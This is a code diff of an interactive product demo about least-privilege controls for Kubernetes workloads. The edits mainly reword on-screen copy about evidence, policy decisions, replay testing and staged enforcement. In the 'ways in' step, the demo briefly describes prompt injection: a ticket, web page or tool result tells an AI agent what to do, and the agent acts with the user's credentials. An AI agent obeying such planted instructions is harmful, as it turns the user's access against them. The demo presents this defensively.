+ ['agt','A hijacked agent','following someone else’s instructions','<b>Prompt injection</b>: a ticket, a web page or a tool result tells the agent what to do, and the agent acts with your credentials.']];
 function sceneE(k,enf=false){ const P=[118,104,124,100], C=[180,142]; let s=DEFS; if(enf) k=4;
   s+=`<rect x="6" y="6" width="348" height="278" rx="14" class="zone ${enf?'ok':''}"/>`;
   s+=`<rect x="${P[0]}" y="${P[1]}" width="${P[2]}" height="${P[3]}" rx="14" class="pod ${enf?'on':''}"/><text x="180" y="${P[1]+P[3]-9}" text-anchor="middle" class="podl">your workload</text>`;
@@ -487,15 +487,15 @@ const TILES=`<div class="tiles"><div><span>network paths · lab</span><b><s>133<
 
 const STEPS=[
  { ch:'Problem', t:'Something will get in.',
-   p:s=>s.k<4?`There are many ways in. You can’t close all of them.`:`What it does next depends on one thing.`,
+   p:s=>s.k<4?`There are many ways in. You can’t close all of them.`:`What happens next depends on one thing.`,
    init:()=>({k:0,sel:null}),
    svg:s=>sceneE(s.k),
-   live:s=>{ if(!s.k) return ''; if(s.k>=4) return `Once inside, it can do <b>whatever the workload is allowed to do</b>. By default: reach the internet, the K8s API and your data.`; const cur=s.sel!=null?s.sel:Math.min(s.k,3)-1;
+   live:s=>{ if(!s.k) return ''; if(s.k>=4) return `Once inside, it can do <b>anything the workload is allowed to do</b>. By default, that means the internet, the K8s API and your data.`; const cur=s.sel!=null?s.sel:Math.min(s.k,3)-1;
      let r=`<div class="slist">${ENTRY.slice(0,Math.min(s.k,3)).map(([n,t,sub,txt],i)=>`<div class="sr ${i===cur&&s.k<4?'cur':''}" data-k="${i}"><span class="k a">${i+1}</span><div class="tt"><b>${t}</b> · ${sub}${i===cur&&s.k<4?`<small>${txt}</small>`:''}</div></div>`).join('')}</div>`;
-     if(s.k>=4) r+=`<small class="foot" style="font-size:14px;color:var(--text)">Once inside, it can do <b>whatever the workload is allowed to do</b>. By default: reach the internet, the K8s API and your data.</small>`; return r; },
-   actl:s=>s.k<3?['A bug','A poisoned package','A hijacked agent'][s.k]:s.k===3?'Then what?':'Pick one to follow', done:s=>s.k>=4, run:s=>{ s.k++; s.sel=null; },
-   end:s=>s.k>=4?`<b>We don’t find bugs. We decide what anything inside can do.</b><span class="pick">${ENTRY.map(([id,t])=>`<button data-sc="${id}">Follow ${t[0].toLowerCase()+t.slice(1)}${SEEN.has(id)?' <i>✓ seen</i>':''}<em>›</em></button>`).join('')}</span>`:'',
-   det:()=>`<h4>Three ways in</h4><table><tr><td>Log4Shell · CVE-2021-44228</td><td>remote code via a log line</td></tr><tr><td>xz backdoor · CVE-2024-3094</td><td>backdoor in a trusted library</td></tr><tr><td>Prompt injection</td><td>agent follows hidden instructions</td></tr></table><h4>The common part</h4><p>None of them needs a new permission. Each one uses what the workload is already allowed to do. Least privilege takes that away, whatever the way in.</p>` },
+     if(s.k>=4) r+=`<small class="foot" style="font-size:14px;color:var(--text)">Once inside, it can do <b>anything the workload is allowed to do</b>. By default, that means the internet, the K8s API and your data.</small>`; return r; },
+   actl:s=>s.k<3?['A bug','A poisoned package','A hijacked agent'][s.k]:s.k===3?'Then what?':'Choose one to follow', done:s=>s.k>=4, run:s=>{ s.k++; s.sel=null; },
+   end:s=>s.k>=4?`<b>We don’t find bugs. We decide what anything inside can do.</b><span class="pick">${ENTRY.map(([id,t])=>`<button data-sc="${id}">Follow ${SCN[id].short}${SEEN.has(id)?' <i>✓ seen</i>':''}<em>›</em></button>`).join('')}</span>`:'',
+   det:()=>`<h4>Three ways in</h4><table><tr><td>Log4Shell · CVE-2021-44228</td><td>remote code via a log line</td></tr><tr><td>xz backdoor · CVE-2024-3094</td><td>backdoor in a trusted library</td></tr><tr><td>Prompt injection</td><td>agent follows hidden instructions</td></tr></table><h4>What they have in common</h4><p>None of them needs a new permission. Each one uses what the workload is already allowed to do. Least privilege takes that away, whatever the way in.</p>` },
  { ch:'Problem', sc:true, t:()=>SC.breachT,
    p:()=>SC.breachP,
    init:()=>({n:0,sel:null}), seq:()=>ATK,
@@ -509,10 +509,10 @@ const STEPS=[
    p:()=>`Cilium and Tetragon are installed. <b>Zero policies.</b> Why?`,
    init:()=>({r:0}),
    svg:s=>sceneB({exc:true,extra:'',over:`<g class="badge"><rect x="96" y="12" width="168" height="44" rx="8"/><text x="108" y="30">Cilium   <tspan class="k">installed</tspan> · <tspan class="z">0 rules</tspan></text><text x="108" y="47">Tetragon <tspan class="k">installed</tspan> · <tspan class="z">0 rules</tspan></text></g>`}),
-   live:s=>s.r?`<div class="why3"><div><b>Knowledge</b><span>App, cluster and risk sit in three different teams.</span></div><div><b>Scale</b><span>84 decisions per namespace. Tens of thousands per company.</span></div><div><b>Change</b><span>A rule written by hand breaks the next release.</span></div></div>`:'',
+   live:s=>s.r?`<div class="why3"><div><b>Knowledge</b><span>App, cluster and risk knowledge sit with three different teams.</span></div><div><b>Scale</b><span>84 decisions per namespace. Tens of thousands per company.</span></div><div><b>Change</b><span>A hand-written rule breaks on the next release.</span></div></div>`:'',
    actl:s=>s.r?'Three reasons':'Why?', done:s=>s.r>0, run:s=>{ s.r=1; },
    end:s=>s.r?'<b>The missing piece is the decision, not the engine.</b>':'',
-   det:()=>`<h4>Benchmark</h4><p>Fairwinds 2024: 58% of organizations had no network policy on most of their workloads.</p><h4>Scale, one company</h4><table><tr><td>12 workloads × 7 layers</td><td>84</td></tr><tr><td>× 50 namespaces</td><td>4,200</td></tr><tr><td>× 10 clusters</td><td>42,000</td></tr><tr><td>every release</td><td>re-check</td></tr></table><h4>Change</h4><p>v3: policy written by hand. v4 adds fraud-check; nobody updated the policy: checkout down. Under pressure: roll back, everything open again.</p>` },
+   det:()=>`<h4>Benchmark</h4><p>Fairwinds 2024: 58% of organizations had no network policy on most of their workloads.</p><h4>Scale, one company</h4><table><tr><td>12 workloads × 7 layers</td><td>84</td></tr><tr><td>× 50 namespaces</td><td>4,200</td></tr><tr><td>× 10 clusters</td><td>42,000</td></tr><tr><td>every release</td><td>re-check</td></tr></table><h4>Change</h4><p>Release 3: the policy is written by hand. Release 4 adds fraud-check, nobody updates the policy, and checkout goes down. Under pressure, the team rolls back and everything is open again.</p>` },
  { ch:'Solution', sc:true, t:'Evidence in.',
    p:()=>`The knowledge exists, scattered across four places that already describe every workload.`,
    init:()=>({n:0,sel:null}),
@@ -522,10 +522,10 @@ const STEPS=[
    live:s=>{ if(!s.n) return ''; const cur=s.sel!=null?s.sel:s.n-1;
      return `<div class="slist">${SC.ev.slice(0,s.n).map(([src,what,txt],i)=>`<div class="sr ${i===cur?'cur':''}" data-k="${i}"><span class="k r" style="min-width:66px">${src}</span><div class="tt"><b>${what}</b>${i===cur?`<small>${txt}</small>`:''}</div></div>`).join('')}</div>`; },
    actl:s=>s.n<4?`Read ${SC.ev[s.n][0]}`:'Evidence collected', done:s=>s.n>=4, run:s=>{ s.n++; s.sel=null; },
-   end:s=>s.n>=4?'Green: what each workload <b>needs</b>, with proof behind every line.':'',
+   end:s=>s.n>=4?'In green: what each workload <b>needs</b>, with evidence behind every line.':'',
    det:()=>SC.evDet },
  { ch:'Solution', sc:true, t:'Decide. Don’t just record.',
-   p:()=>`Each path and program is checked against all the evidence. Seen once is not enough: it has to make sense.`,
+   p:()=>`Every path and program is checked against all four sources. Being seen once isn’t enough; it has to make sense.`,
    init:()=>({d:0}),
    svg:s=>{ const chips=s.d>=2?chipRow(SC.decChips):coreChip();
      const kept=s.d>=2?`<line x1="212" y1="158" x2="222" y2="86" class="e kept"/>${xmark(222,84,false,true)}<g class="flag"><rect x="140" y="38" width="130" height="32" rx="6"/><text x="205" y="51" text-anchor="middle">KEPT OUT</text><text x="205" y="64" text-anchor="middle" style="font-size:9px">${SC.kept}</text></g>`:'';
@@ -535,7 +535,7 @@ const STEPS=[
    end:s=>'',
    det:()=>SC.decDet },
  { ch:'Solution', sc:true, t:'Seven layers. Each one decided.',
-   p:s=>s.z?`Inside one workload. Least privilege is more than the network: every layer gets its own rule.`:`So far: paths between workloads. Now let’s go <b>inside one</b>.`,
+   p:s=>s.z?`Inside one workload. Least privilege is more than the network: every layer gets its own rule.`:`So far: paths between workloads. Now, <b>inside one</b>.`,
    init:()=>({k:0,sel:null,z:false,zoom:0}),
    svg:s=>!s.z?`<g class="${s.zoom?'zin':''}">${sceneB({tint:false,need:true,podOn:false,chips:coreChip()})}</g>`:`<g class="${s.k===0&&s.sel==null?'zout':''}">${sceneL(s.k,s.sel!=null?s.sel:Math.max(0,s.k-1))}</g>`,
    live:s=>s.z?layerLive(s):'',
@@ -544,18 +544,18 @@ const STEPS=[
    end:s=>s.k>=7?SC.layEnd:'',
    det:()=>`<h4>${SC.wl} · one profile, seven layers</h4><table>${SC.layers.map(L=>`<tr><td>${L[0]}</td><td class="${L[5]==='next'?'y':'g'}">${L[2]} · ${L[5]==='next'?'next':L[5]==='lab'?'lab':'same engines'}</td></tr>`).join('')}</table><h4>Why every layer</h4><p>Network rules stop the call home. Programs stop what runs if code gets in another way. Privileges stop the escape. Files stop credential theft. Each layer stops a different step of the same attack.</p>` },
  { ch:'Solution', sc:true, t:'Proven before it’s applied.',
-   p:()=>`Every recorded connection runs through the new policy, offline. If one the app needs would drop, nothing is applied.`,
+   p:()=>`Every recorded connection is replayed against the new policy, offline. If a single needed connection would drop, nothing is applied.`,
    init:()=>({st:0,miss:false}),
    svg:s=>{ let dots=''; if(s.st===1&&!reduce) dots=NEED.map(([a,b,d],i)=>{ const p=d||`M${pt(a)[0]} ${pt(a)[1]} L${pt(b)[0]} ${pt(b)[1]}`; return `<circle r="2.8" class="pk"><animateMotion dur="1.1s" begin="${i*.14}s" repeatCount="indefinite" path="${p}"/></circle>`; }).join('');
      let ex=''; if(s.miss){ const [x1,y1,x2,y2]=trim(BN.fe,BC,17,20); const mx=(x1+x2)/2,my=(y1+y2)/2; ex=`<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" class="e atk"/>`+xmark(mx,my,false,true); }
      return sceneB({tint:false,need:true,chips:coreChip(true),extra:dots+ex}); },
    live:s=>s.st===0?'':s.st===1?SC.replay:s.miss?`<span class="k a">FAIL</span><b>${SC.fail}</b><small>The policy is not applied. Nothing in production changed.</small>`:`<span class="k b">PASS</span>Every needed connection still works.<small>${SC.pass}</small>`,
-   actl:s=>s.st===0?'Replay the traffic':s.st===1?'Replaying…':s.miss?'Back to the real policy':`What if ${SC.missL} was missed?`,
+   actl:s=>s.st===0?'Replay the traffic':s.st===1?'Replaying…':s.miss?'Back to the real policy':`What if we missed ${SC.missL}?`,
    done:s=>s.st>=2, busy:s=>s.st===1, run:(s,re)=>{ if(s.st>=2){ s.miss=!s.miss; return; } s.st=1; later(2600,()=>{ s.st=2; re(); }); }, sticky:true,
    end:s=>'',
    det:()=>SC.proveDet },
  { ch:'Proof', sc:true, t:'Enforce in stages.',
-   p:()=>`Each stage is applied only after approval, checked live, and rolled back in one step.`,
+   p:()=>`Each stage goes live only after approval, is checked in production, and can be rolled back in one step.`,
    init:()=>({k:0}),
    svg:s=>{ let ex=''; const blockAt=(k)=>{ const [x1,y1,x2,y2]=trim(BC,BN[k],20,17); const [bx,by]=exitRect(x1,y1,x2,y2,BP); return xmark(bx,by,true,true); };
      const exc=s.k<3?EXC.filter(k=>(k!=='api'||s.k<1)&&(k!=='att'||s.k<2)):[];
@@ -571,27 +571,27 @@ const STEPS=[
    init:()=>({n:0,sel:null,enf:true,all:false}), seq:()=>ATK,
    svg:s=>{ const steps=ATK.map((x,i)=>[x[0],x[1],x[2],i<SC.allow?x[3]:'b']); const n=s.all?ATK.length:Math.min(s.n,SC.allow+1);
      return sceneA({steps,n,fresh:s.all?-1:s.n-1,enforced:true,label:SC.wl+' pod · enforced'}); },
-   live:s=>{ if(!s.n) return ''; const r=seqLive(ATK,s,s.all?ATK.length:Math.min(s.n,SC.allow+1)); if(s.all) return r+`<small class="foot">Even if it got further, <b>every next step is blocked</b> by a specific rule. Tap a step to see it.</small>`; return r+(s.n>SC.allow?`<small class="foot"><b class="ok">Stopped at step ${SC.allow+1}.</b> ${SC.againEnd}</small>`:''); },
+   live:s=>{ if(!s.n) return ''; const r=seqLive(ATK,s,s.all?ATK.length:Math.min(s.n,SC.allow+1)); if(s.all) return r+`<small class="foot">Even if it got further, <b>every next step is blocked</b> by a specific rule. Tap a step to see which.</small>`; return r+(s.n>SC.allow?`<small class="foot"><b class="ok">Stopped at step ${SC.allow+1}.</b> ${SC.againEnd}</small>`:''); },
    track:s=>s.all?ATK.length:Math.min(s.n,SC.allow+1),
    actl:s=>s.n===0?'Run it again':s.n<=SC.allow?`Next step › ${s.n+1}`:!s.all?'What if it got further?':'All steps blocked',
    done:s=>s.n>SC.allow, run:s=>{ if(s.n<=SC.allow){ s.n++; } else s.all=true; s.sel=null; }, sticky:true,
    end:s=>'',
    det:()=>`<h4>The rules that stop it</h4><table>${ATK.filter(a=>a[6]).map((a)=>`<tr><td>${ATK.indexOf(a)+1}. ${a[6]}</td><td>${a[7]}</td></tr>`).join('')}</table>` },
  { ch:'Proof', sc:true, t:'What changed.',
-   p:()=>`${SC.wl}, before and after. Same code, same bug or backdoor inside.`,
+   p:()=>`${SC.wl}, before and after. ${SC.inside}`,
    init:()=>({k:0}),
    svg:s=>sceneBA(s.k),
    live:s=>s.k<7?'':`<b>7 of 7 layers decided.</b> Nothing the ${SC.id==='agt'?'agent':'app'} needs was dropped.<small>${SC.lab?'Green: in the lab today. Yellow: design, next.':'Same engines as the lab run. Yellow: design, next.'}</small>`,
    actl:s=>s.k<7?'Show what changed':'All layers closed', done:s=>s.k>=7, run:(s,re)=>{ for(let i=1;i<=7;i++) later(i*260,()=>{ s.k=i; re(); }); s.k=0.01; }, busy:s=>s.k>0&&s.k<7,
    end:s=>'', det:null },
  { ch:'Why now', t:'The decisions multiply.',
-   p:()=>`One workload is 7 decisions. Now count them across a company, and add the agents.`,
+   p:()=>`One workload means 7 decisions. Count them across a company, then add the agents.`,
    init:()=>({k:0}),
    svg:s=>{ const R=[['one namespace','12 workloads × 7 layers',84,'w'],['one company','× 50 namespaces',4200,'w'],['all clusters','× 10 clusters',42000,'w'],['plus agents','1,000 agents × 7 layers',7000,'g']]; const mx=Math.log10(50000); let g=DEFS;
      R.forEach(([l,sub,v,c],i)=>{ const y=30+i*64, on=i<s.k, w=Math.max(8,316*Math.log10(v)/mx);
        g+=`<g class="mul ${on?'on':''} ${c}"><text x="22" y="${y+12}" class="mull">${l}</text><text x="22" y="${y+27}" class="muls">${sub}</text><text x="338" y="${y+26}" text-anchor="end" class="mulv">${on?v.toLocaleString('en-US'):''}</text><rect x="22" y="${y+36}" width="316" height="7" rx="3.5" class="mut"/><rect x="22" y="${y+36}" width="${on?w:0}" height="7" rx="3.5" class="mub"/></g>`; });
      return g; },
-   live:s=>['','<b>84 decisions</b> in one small namespace. A person can still do this.','<b>4,200.</b> Now it is a team’s full-time job.','<b>42,000</b>, and every release changes some of them.','<b>+ 7,000 for agents</b>, whose tools change every week.<small>Only a product can decide each one, prove it, and keep it current.</small>'][s.k],
+   live:s=>['','<b>84 decisions</b> in one small namespace. A person can still manage this.','<b>4,200.</b> Now it’s a full-time job for a team.','<b>42,000</b>, and every release changes some of them.','<b>+ 7,000 for agents</b>, whose tools change every week.<small>Only a product can decide each one, prove it, and keep it current.</small>'][s.k],
    actl:s=>s.k<4?['Count one namespace','× 50 namespaces','× 10 clusters','Add the agents'][s.k]:'Multiplied', done:s=>s.k>=4, run:s=>{ s.k++; },
    end:s=>'', det:()=>`<h4>The math</h4><table><tr><td>12 workloads × 7 layers</td><td>84</td></tr><tr><td>× 50 namespaces</td><td>4,200</td></tr><tr><td>× 10 clusters</td><td>42,000</td></tr><tr><td>1,000 agents × 7 layers</td><td>+ 7,000</td></tr><tr><td>every release</td><td>re-check</td></tr></table><p>Illustrative company size. Benchmark: Fairwinds 2024, 58% of organizations had no network policy on most workloads.</p>` },
  { ch:'Summary', t:'What you just saw.', close:true,
@@ -599,12 +599,12 @@ const STEPS=[
    init:()=>({}),
    svg:()=>sceneE(4,true),
    live:()=>`<div class="slist">${ENTRY.map(([id,t])=>{ const seen=SEEN.has(id), S=SCN[id]; return `<div class="sr cur sumr" style="opacity:1;align-items:center"><span class="k ${seen?'b':''}" style="min-width:22px;${seen?'':'background:var(--line);color:var(--muted)'}">${seen?'✓':'·'}</span><div class="tt" style="white-space:normal"><b>${t}</b><small>${seen?`<span class="ok">Stopped at step ${S.allow+1}</span> · ${S.wl}`:'Not watched yet'}</small></div><button class="watchb" data-sc="${id}">${seen?'Again':'Watch'} ›</button></div>`; }).join('')}</div><div class="flow"><span>Evidence</span><i>›</i><span>Decide</span><i>›</i><span>Prove</span><i>›</i><span>Enforce</span></div>`,
-   actl:()=>{ const u=ENTRY.find(e=>!SEEN.has(e[0])); return u?`Watch ${u[1][0].toLowerCase()+u[1].slice(1)} ›`:'All three seen'; }, done:()=>!ENTRY.some(e=>!SEEN.has(e[0])),
+   actl:()=>{ const u=ENTRY.find(e=>!SEEN.has(e[0])); return u?`Watch ${SCN[u[0]].short} ›`:'All three watched'; }, done:()=>!ENTRY.some(e=>!SEEN.has(e[0])),
    run:()=>{ const u=ENTRY.find(e=>!SEEN.has(e[0])); if(u) choose(u[0]); },
-   end:()=>`${NSBA}<span style="display:block;margin-top:8px;font:500 12px var(--body);color:var(--muted)">Before → after, measured in the lab. Package and agent runs: illustration with the same engines.</span>`,
+   end:()=>`${NSBA}<span style="display:block;margin-top:8px;font:500 12px var(--body);color:var(--muted)">Before → after, measured in the lab. The package and agent runs are illustrations using the same engines.</span>`,
    det:()=>`<h4>What is real today</h4><p>Lab namespace boutique (12 workloads): evidence from manifests, Hubble and Tetragon; classification; CiliumNetworkPolicy generation; flow replay; staged enforcement with rollback; program allow-lists with exec replay.</p><h4>Design, next</h4><p>File profiles, agent profiles from agent config, more engines.</p>` },
  { ch:'Solution', sc:true, t:'Same process, its own decisions.',
-   p:()=>`You’ve seen the full process. Here is what it decided for <b>${SC.wl}</b>.`,
+   p:()=>`You’ve seen the full process once. Here’s what it decided for <b>${SC.wl}</b>.`,
    init:()=>({k:0,sel:null}),
    svg:s=>sceneL(Math.min(7,[0,2,4,6,7][s.k]),-1),
    live:s=>{ if(!s.k) return ''; const N=['Evidence','Decide','Prove','Enforce']; const cur=s.sel!=null?s.sel:s.k-1;
@@ -619,10 +619,10 @@ const FULL=[0,1,2,3,4,5,6,7,8,9,10,11], SHORT=[0,1,12,8,9,11]; let ROUTE=FULL;
 const ri=()=>ROUTE.indexOf(at), nextOf=()=>ROUTE[ri()+1], prevOf=()=>ROUTE[ri()-1];
 // ---------- chapter interstitials: the whole process, where we are
 const CHAP=[['Problem',['Ways in','Full breach','Engines, no rules']],['Solution',['Evidence','Decide','7 layers','Prove']],['Proof',['Enforce in stages','Same attack, stopped','Before → after']],['Why now',['42,000 decisions']],['Summary',['What you saw']]];
-const BRIDGE={Solution:'The engines exist. What’s missing is <b>the decision</b>. Here is how we make it.',Proof:'Decided from evidence, proven offline. <b>Now it goes live.</b>',['Why now']:'That was one workload. <b>Now multiply it.</b>',Summary:'Whatever gets in, <b>can only do what it needs.</b>'};
+const BRIDGE={Solution:'The engines exist. What’s missing is <b>the decision</b>. Here is how we make it.',Proof:'Decided from evidence, proven offline. <b>Now it goes live.</b>',['Why now']:'That was one workload. <b>Now multiply it.</b>',Summary:'Whatever gets in <b>can only do what it needs.</b>'};
 let interTo=null;
 function inter(i){ const ch=STEPS[i].ch, ci=CHAP.findIndex(c=>c[0]===ch);
-  $('interK').textContent=`Chapter ${ci+1} of ${CHAP.length} · following ${SC.way.toLowerCase()}`; $('interH').innerHTML=BRIDGE[ch]||ch;
+  $('interK').textContent=`Chapter ${ci+1} of ${CHAP.length} · following ${SC.short}`; $('interH').innerHTML=BRIDGE[ch]||ch;
   $('road').innerHTML=CHAP.map(([n,ss],j)=>`<li class="${j<ci?'d':j===ci?'n':''}"><span class="dot">${j<ci?'✓':j+1}</span><b>${n}</b><div class="ss">${ss.map(x=>`<span>${x}</span>`).join(j===ci?'<i>›</i>':'')}</div></li>`).join('');
   const go=()=>{ clearTimeout(interTo); $('inter').classList.remove('on'); $('interA').classList.remove('run'); show(i); };
   $('interGo').onclick=go; $('inter').classList.add('on');
@@ -635,7 +635,7 @@ function meter(){ const s=ST[at]; let n=0; if(at===7) n=[0,2,3,4,6][s.k]; else i
 function render(fade){
   const st=STEPS[at], s=ST[at];
   $('prog').innerHTML=ROUTE.map((_,i)=>`<i class="${i<ri()?'d':i===ri()?'n':''}"></i>`).join('');
-  $('chap').innerHTML=`<span>${st.ch}${st.sc?` · ${SC.way.toLowerCase()}`:''}${st.sc&&!SC.lab?' · <b class="ill">illustration</b>':''}</span><em>${ri()+1} / ${ROUTE.length}</em>`;
+  $('chap').innerHTML=`<span>${st.ch}${st.sc?` · ${SC.short}`:''}${st.sc&&!SC.lab?' · <b class="ill">illustration</b>':''}</span><em>${ri()+1} / ${ROUTE.length}</em>`;
   $('map').innerHTML=st.svg(s);
   const tr=$('track'); if(st.seq){ const cnt=st.track?st.track(s):s.n; const fake={...s,n:cnt}; tr.innerHTML=trackHTML(st.seq(),fake); tr.style.display=''; tr.querySelectorAll('[data-k]').forEach(b=>b.onclick=()=>{ s.sel=+b.dataset.k; render(); }); } else { tr.innerHTML=''; tr.style.display='none'; }
   if(fade){ $('stage').classList.remove('fade'); void $('stage').offsetWidth; $('stage').classList.add('fade'); }
